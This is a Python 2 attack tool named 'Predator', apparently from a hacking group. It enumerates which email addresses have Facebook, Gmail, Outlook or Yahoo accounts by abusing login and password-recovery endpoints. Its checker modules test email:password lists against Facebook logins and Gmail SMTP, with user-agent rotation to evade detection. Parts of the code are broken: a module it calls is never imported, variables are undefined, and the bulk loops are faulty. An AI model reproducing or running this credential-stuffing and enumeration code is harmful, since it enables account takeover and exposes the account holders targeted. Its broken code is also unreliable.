#!/usr/bin/python
# Developed by @RadhwenBen
# Enhanced by @TNCyberArmy
import os
import sys
import urllib
from mechanize  import Browser
from bs4 import BeautifulSoup
import cookielib
import mechanize
import random
import smtplib

def clear_screen():
    if os.name == 'nt':
        os.system('cls')  # Clear Terminal Windows
    else:
        os.system('clear')  # Clear Terminal in Linux


def banner():
    print """
                        _       _             
	                   | |     | |            
	 _ __  _ __ ___  __| | __ _| |_ ___  _ __ 
	| '_ \| '__/ _ \/ _` |/ _` | __/ _ \| '__|
	| |_) | | |  __/ (_| | (_| | || (_) | |   
	| .__/|_|  \___|\__,_|\__,_|\__\___/|_|   
	| |                                       
	|_|    [+] @TNCyberArmy & @RadhwenBen [+]
    """


def main_menu():
    print """
        1 ) Enumeration 
        2 ) Checker
        99) Exit
    """


def enumeration_menu():
    print """
        1) Facebook
        2) Gmail
        3) Apple
        4) PayPal
        5) outl00k
        6) yaho0
        99) Back to main menu
    """


def Checker_menu():
    print """
        1) Facebook
        2) Gmail
        3) Apple
        4) PayPal
        5) outl00k
        6) yahoo
        99) Back to main menu
    """


def enumerate_facebook():
    """Function that Enumerate Facebook"""
    ENUMERATION_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of Enumeration 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna enumerate (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        -------------------------------------------
        """ % (ENUMERATION_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK)

    def single():
        print "Check for one meail"
        url_www = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover&lsd=AVrNj_gH&email=%s&did_submit=Procurar&__user=0&__a=1&__dyn=7xe1JAwZwRyUhxPLHwn84a2i5UdoS1Fx-ewICwPyEjwmE&__req=5&__rev=1959518" % EMAIL_TO_CHECK #to solve some case where the link should be web.facebook.Com
        url_web = "https://web.facebook.com/ajax/login/help/identify.php?ctx=recover&lsd=AVrNj_gH&email=%s&did_submit=Procurar&__user=0&__a=1&__dyn=7xe1JAwZwRyUhxPLHwn84a2i5UdoS1Fx-ewICwPyEjwmE&__req=5&__rev=1959518" % EMAIL_TO_CHECK
        response_www = urllib.urlopen(url_www)
        response_web = urllib.urlopen(url_web)
        if "window.location" in response_www.read() or "window.location" in response_web.read():
            print "[+] Target Email %s have a facebook account!" % EMAIL_TO_CHECK
        else:
            print "[-] Target Email %s dose not have any facebook account!" % EMAIL_TO_CHECK

    def bulk():
        print "Facebook@PREDATOR >> Running bulk Enumeration"
        try:
            emails = [email.strip() for email in open(MAIL_LIST_PATH,'r').read().split('\n')]
        except:
            print "[ERR] Mail list path seems to be invalid please verify the path"
            return
        total = []
        for email in emails:
            url_www = "https://web.facebook.com/ajax/login/help/identify.php?ctx=recover&lsd=AVrNj_gH&email=%s&did_submit=Procurar&__user=0&__a=1&__dyn=7xe1JAwZwRyUhxPLHwn84a2i5UdoS1Fx-ewICwPyEjwmE&__req=5&__rev=1959518" % email  # to solve some case where the link should be web.facebook.Com
            url_web = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover&lsd=AVrNj_gH&email=%s&did_submit=Procurar&__user=0&__a=1&__dyn=7xe1JAwZwRyUhxPLHwn84a2i5UdoS1Fx-ewICwPyEjwmE&__req=5&__rev=1959518" % email
            response_www = urllib.urlopen(url_www)
            response_web = urllib.urlopen(url_web)
            if "window.location" in response_www.read() or "window.location" in response_web.read():
                print "[+] Target Email %s have a facebook account!" % email
                total += ["%s" % email.rsplit()]
            else:
                print "[-] Target Email %s dose not have any facebook account!" % email

    def run():
        if ENUMERATION_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ FACEBOOK Enumeration --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [FACEBOOK ENUMERATION] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email']:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            ENUMERATION_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])
        else:
            # Go Back to Main
            main()
        command_input = ""


def enumerate_Gmail():
    """Function that Enumerate Gmail"""
    ENUMERATION_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of Enumeration 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna enumerate (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        -------------------------------------------
        """ % (ENUMERATION_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK)

    def single():
        print "Check for one meail"
        global br
        br = Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
        br.addheaders = [('user-agent','Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1')] #use a WAP user agent for easier page manipulation
        site = "https://accounts.google.com/ServiceLogin"
        br.open(site)
        br.select_form(nr=0)
        br.form["Email"]=EMAIL_TO_CHECK
        r =  br.submit()
        html = r.read()   
        if "errormsg_0_Email" not in html:
            print("target ,%s have gmail account" %EMAIL_TO_CHECK)
        else:
            print("target ,%s dosn't have gmail  account " %EMAIL_TO_CHECK)

    def bulk():
        global br
        print "Gmail@PREDATOR >> Running bulk Enumeration"
        try:
            emails = [email.strip() for email in open(MAIL_LIST_PATH,'r').read().split('\n')]
        except:
            print "[ERR] Mail list path seems to be invalid please verify the path"
            return
        total = []
        for email in emails:
            br = Browser()
            cj = cookielib.LWPCookieJar()
            br.set_handle_robots(False)
            br.set_handle_equiv(True)
            br.set_handle_referer(True)
            br.set_handle_redirect(True)
            br.set_cookiejar(cj)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
            br.addheaders = [('user-agent','Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1')] #use a WAP user agent for easier page manipulation
            site = "https://accounts.google.com/ServiceLogin"
            br.open(site)
            br.select_form(nr=0)
            br.form["Email"]=email
            r =  br.submit()
            html = r.read()
            if "errormsg_0_Email" not in html:
                print("target ,%s have gmail account" %email)
            else:
                print("target ,%s dosn't have gmail  account " %email)

    def run():
        if ENUMERATION_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ Gmail Enumeration --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [Gmail ENUMERATION] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email']:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            ENUMERATION_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])
        else:
            # Go Back to Main
            main()
        command_input = ""


def enumerate_Outl00k():
    """Function that checker Outl00k"""
    CHECKING_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None
    password =None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of CHECKING 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna checker (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        -------------------------------------------
        """ % (CHECKING_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK)
        
    def single():
        print "Check for one meail"
        payload = {'username':EMAIL_TO_CHECK,"uaid":"7d825624753e414a9f84b6c54e6d63e9","isOtherIdpSupported":False,"checkPhones":False,"isRemoteNGCSupported":True}
        r = requests.post("https://login.live.com/login.srf", data=payload)
        if "That Microsoft account doesn't exist." in r.text.lower():
            print("[-] Target Email %s dose not have any Outl00k account!" % EMAIL_TO_CHECK)
        else:
            print("[-] Target Email %s  have any Outl00k account!" % EMAIL_TO_CHECK)
    def bulk():
        print ("Facebook@PREDATOR >> Running bulk Enumeration")
        try:
            emails = [email.strip() for email in open(MAIL_LIST_PATH,'r').read().split('\n')]
        except:
            print ("[ERR] Mail list path seems to be invalid please verify the path")
            return
        total = []
        for email in emails:
            payload = {'username':email,"uaid":"7d825624753e414a9f84b6c54e6d63e9","isOtherIdpSupported":False,"checkPhones":False,"isRemoteNGCSupported":True}
            r = requests.post("https://login.live.com/login.srf", data=payload)
            if "That Microsoft account doesn't exist." in r.text.lower():
                print("[-] Target Email %s dose not have any Outl00k account!" % email)
            else:
                print("[-] Target Email %s  have any Outl00k account!" % email)


    def run():
        if CHECKING_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ Outl00k CHECKING --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [Outl00k CHECKING] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email']:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            CHECKING_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])
        else:
            # Go Back to Main
            main()
        command_input = ""


def enumerate_Yah0o():
    """Function that checker Yah0o"""
    CHECKING_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None
    password =None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of CHECKING 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna checker (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        -------------------------------------------
        """ % (CHECKING_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK)
        
    def single():
        print "Check for one meail"
        payload = {'username':EMAIL_TO_CHECK}
        r = requests.post("https://login.yahoo.com/", data=payload)
        if "Sorry, we don't recognize this email." in r.text.lower():
            print("[-] Target Email %s dose not have any Yah0o account!" % EMAIL_TO_CHECK)
        else:
            print("[-] Target Email %s  have any Yah0o account!" % EMAIL_TO_CHECK)
    def bulk():
        print ("Facebook@PREDATOR >> Running bulk Enumeration")
        try:
            emails = [email.strip() for email in open(MAIL_LIST_PATH,'r').read().split('\n')]
        except:
            print ("[ERR] Mail list path seems to be invalid please verify the path")
            return
        total = []
        for email in emails:
            payload = {'username':email}
            r = requests.post("https://login.yahoo.com/", data=payload)
            if "Sorry, we don't recognize this email." in r.text.lower():
                print("[-] Target Email %s dose not have any Yah0o account!" % email)
            else:
                print("[-] Target Email %s  have any Yah0o account!" % email)


    def run():
        if CHECKING_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ Yah0o CHECKING --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [Yah0o CHECKING] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email']:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            CHECKING_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])
        else:
            # Go Back to Main
            main()
        command_input = ""
        

def checker_facebook():
    """Function that checker Facebook"""
    CHECKING_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None
    password =None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of CHECKING 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna checker (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        PASS             %s
        -------------------------------------------
        """ % (CHECKING_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK,password)
        
    def single():
        global br
        print "Check for one meail"
        br = Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
        headers =[('user-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36')]
        br.addheaders = [('user-agent',random.choice(headers))]
        site=br.open("https://web.facebook.com/login.php")
        br.select_form(nr=0)
        br.form["email"]=EMAIL_TO_CHECK
        br.form["pass"]=password
        br.submit()
        test_url=br.geturl()
        if test_url !=site:
            print("[-] Target Email %s and %s is correct you can enter to facebook account!" % email ,password)
        else:
            print("[-] Target Email %s and %s is Not correct you can't enter to facebook account!" % email , password)
    def bulk():
        global br
        print "Facebook@PREDATOR >> Running bulk CHECKING"
        br = Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
        headers =[('user-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36')]
        br.addheaders = [('user-agent',random.choice(headers))]
        email =MAIL_LIST_PATH 
        w = open(email,"r")
        for i in email.readlines():
            email=line.split(':')[0]
            passwd = line.split(':')[1]
            i=i.rstrip("\n")
        br.open("https://web.facebook.com/login.php")
        br.select_form(nr=0)
        br.form["email"]=email
        br.form["pass"]=passwd
        br.submit()
    def run():
        if CHECKING_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ FACEBOOK CHECKING --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [FACEBOOK CHECKING] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email',password]:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            CHECKING_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])

        else:
            # Go Back to Main
            main()
        command_input = ""


def checker_Gmail():
    """Function that checker Gmail"""
    CHECKING_MODE = 'SINGLE'
    MAIL_LIST_PATH = None
    EMAIL_TO_CHECK = None
    password =None

    def help():
        print """
        ----------------------------------------------
        Available Options are 
        ----------------------------------------------
        MODE : SINGLE / BULK is the mode of CHECKING 
            SINGLE : Check only one Mail
            BULK : Check a list of mail from the FILE MAIL_LIST_PATH
        FILE : Path for the Mail list you wanna checker (Only Required on  BULK Mode)
        EMAIL : EMAIL you want to check  (Only Require on SINGLE Mode)
        ----------------------------------------------
        Available Commands are 
        ----------------------------------------------
        SET [OPTION NAME] [VALUE]   : set option value
        RUN                         : run the module
        EXIT                        : Exit Module
        HELP                        : Show Help
        SHOW                        : Show Current options values
        ----------------------------------------------
        """

    def show():
        print """
        Name             Value
        -------------------------------------------
        MODE             %s
        FILE             %s
        EMAIL            %s
        PASS             %s
        -------------------------------------------
        """ % (CHECKING_MODE, MAIL_LIST_PATH, EMAIL_TO_CHECK,password)

    def single():
        print "Check for one meail"
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        try:
            smtpserver.login(EMAIL_TO_CHECK, password)
            print "[+] Password correct : %s for %s" % password , EMAIL_TO_CHECK
            pass
        except smtplib.SMTPAuthenticationError:
            print "[+] Password incorrect : %s for %s" % password , EMAIL_TO_CHECK
    def bulk():
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        print "Gmail@PREDATOR >> Running bulk CHECKING"
        for i in MAIL_LIST_PATH:
            user=line.split(':')[0]
            password=line.split(':')[1]
            try:
                smtpserver.login(user, password)
                print "[+] Password Found: %s" % password
                break;
            except smtplib.SMTPAuthenticationError:
                print "[!] Password Incorrect: %s" % passw
    def run():
        if CHECKING_MODE.lower() == 'bulk':
            bulk()
        else:
            single()

    command_input = ""
    """
    Command List
    SET [OPTION] [VALUE]
    SHOW
    RUN
    HELP
    EXIT
    """
    banner()
    print "------------------ Gmail CHECKING --------------------"
    print "[*] TYPE HELP to see availble options"
    print "------------------------------------------------------------"
    while True:
        while not (
                                command_input.lower().startswith("set")
                            or
                                command_input.lower().startswith("show")
                            or
                                command_input.lower().startswith("run")
                            or
                                command_input.lower().startswith("help")
                            or
                                command_input.lower().startswith("exit")
        ):
            command_input = raw_input("Predator [Gmail CHECKING] >> ")

        if command_input.startswith("help"):
            help()
        elif command_input.startswith("show"):
            show()
        elif command_input.startswith("run"):
            run()
        elif command_input.lower().startswith("set"):
            options = command_input.split(" ")
            if len(options) < 2:
                print "[-] Wrong Syntax please use SET [OPTION] [VALUE]"
            else:
                if options[1].lower() not in ['mode', 'file', 'email']:
                    print "[-] Uknown Option %s please use one of the available options (MODE, FILE, EMAIL)" % options[
                        1]
                else:
                    if options[1].lower() == 'mode':
                        if ' '.join(options[2:]).lower() not in ['single', 'bulk']:
                            print "[-] Uknown Value %s please use one of the following value (SINGLE, BULK)"
                        else:
                            CHECKING_MODE = ' '.join(options[2:])
                    elif options[1].lower() == 'file':
                        MAIL_LIST_PATH = ' '.join(options[2:])
                    else:
                        EMAIL_TO_CHECK = ' '.join(options[2:])
        else:
            # Go Back to Main
            main()
        command_input = ""


def main():
    module_input = None
    while module_input not in [1, 2, 99]:
        clear_screen()
        banner()
        main_menu()
        module_input = int(raw_input("Predator (module number) >> "))

    if module_input == 1:
        # Enumeration Menu
        module_input = None
        while module_input not in [1, 2, 3, 4 ,5 ,6 ,99]:
            clear_screen()
            banner()
            enumeration_menu()
            module_input = int(raw_input("Predator (Enumeration Service) >> "))
        if module_input == 1:
            enumerate_facebook()
        elif module_input == 2:
            enumerate_Gmail()
        elif module_input == 3:
            print "Going to enumerate Apple"
        elif module_input ==4:
            print "Going to enmerate PayPal"
        elif module_input == 5:
            enumerate_Outl00k()
        elif module_input == 6:
            enumerate_Yah0o()
        else:
            main()

    elif module_input == 2:
        clear_screen()
        banner()
        Checker_menu()
        module_input = int(raw_input("Predator (Enumeration Service) >> "))
        if module_input == 1:
            checker_facebook()
        elif module_input == 2:
            checker_Gmail()
        elif module_input == 3:
            print "Going to checking Apple"
        elif module_input == 4:
            print "Going to checking PayPal"
        elif module_input ==5:
            print "Going to checking outl00k"
        elif module_input ==6:
            print "Going to checking Yahoo"
        else:
            main()
    else:
        sys.exit()


if __name__ == "__main__":
    main()
